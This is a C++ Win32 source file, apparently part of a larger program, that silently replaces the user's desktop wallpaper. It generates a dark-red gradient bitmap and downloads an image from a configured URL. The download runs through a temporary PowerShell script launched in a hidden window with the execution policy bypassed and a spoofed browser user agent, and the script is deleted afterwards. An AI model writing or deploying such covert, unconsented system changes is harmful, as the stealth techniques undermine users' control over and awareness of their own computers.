#include "wallpaper.h"
#include "globals.h"

static wchar_t g_bmpPath[MAX_PATH] = {};

void SetFallbackWallpaperNow() {
    const int rs = ((SW * 3 + 3) & ~3);
    DWORD ds = (DWORD)(rs * SH);
    BYTE* px = (BYTE*)calloc(ds, 1); if (!px) return;
    for (int y = 0; y < SH; y++) {
        BYTE r = (BYTE)(8 + (SH - 1 - y) * 70 / SH);
        for (int x = 0; x < SW; x++) { int i = y*rs+x*3; px[i]=0; px[i+1]=0; px[i+2]=r; }
    }
    GetTempPathW(MAX_PATH, g_bmpPath); wcscat_s(g_bmpPath, L"hwall.bmp");
    BITMAPFILEHEADER fh = {}; fh.bfType = 0x4D42;
    fh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fh.bfSize    = fh.bfOffBits + ds;
    BITMAPINFOHEADER ih = {}; ih.biSize=sizeof(ih); ih.biWidth=SW; ih.biHeight=SH;
    ih.biPlanes=1; ih.biBitCount=24; ih.biCompression=BI_RGB; ih.biSizeImage=ds;
    HANDLE hf = CreateFileW(g_bmpPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hf, &fh, sizeof(fh), &w, nullptr);
        WriteFile(hf, &ih, sizeof(ih), &w, nullptr);
        WriteFile(hf, px, ds, &w, nullptr); CloseHandle(hf);
        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, g_bmpPath,
                              SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    }
    free(px);
}

void DownloadWallpaperAsync() {
    wchar_t tmpDir[MAX_PATH], jpgPath[MAX_PATH], ps1Path[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpDir);
    wcscpy_s(jpgPath, tmpDir); wcscat_s(jpgPath, L"hwall.jpg");
    wcscpy_s(ps1Path, tmpDir); wcscat_s(ps1Path, L"hwall.ps1");
    char jpgA[MAX_PATH], urlA[512];
    WideCharToMultiByte(CP_ACP,0,jpgPath,-1,jpgA,MAX_PATH,nullptr,nullptr);
    WideCharToMultiByte(CP_ACP,0,WALL_URL,-1,urlA,512,nullptr,nullptr);
    char ps1[2048];
    sprintf_s(ps1,
        "[Net.ServicePointManager]::SecurityProtocol='Tls12'\r\n"
        "$ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'\r\n"
        "try{Invoke-WebRequest -Uri '%s' -OutFile '%s' -UserAgent $ua}catch{}\r\n",
        urlA, jpgA);
    HANDLE hf = CreateFileW(ps1Path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(hf, ps1, (DWORD)strlen(ps1), &w, nullptr); CloseHandle(hf);
    }
    wchar_t psCmd[MAX_PATH+80];
    swprintf_s(psCmd, L"powershell -WindowStyle Hidden -NonInteractive"
                      L" -ExecutionPolicy Bypass -File \"%s\"", ps1Path);
    STARTUPINFOW si={sizeof(si)}; si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
    PROCESS_INFORMATION pi={};
    if (CreateProcessW(nullptr,psCmd,nullptr,nullptr,FALSE,CREATE_NO_WINDOW,nullptr,nullptr,&si,&pi)){
        WaitForSingleObject(pi.hProcess, 20000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
    DeleteFileW(ps1Path);
    WIN32_FILE_ATTRIBUTE_DATA fa={};
    if (GetFileAttributesExW(jpgPath, GetFileExInfoStandard, &fa) && fa.nFileSizeLow > 10240)
        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, jpgPath,
                              SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}
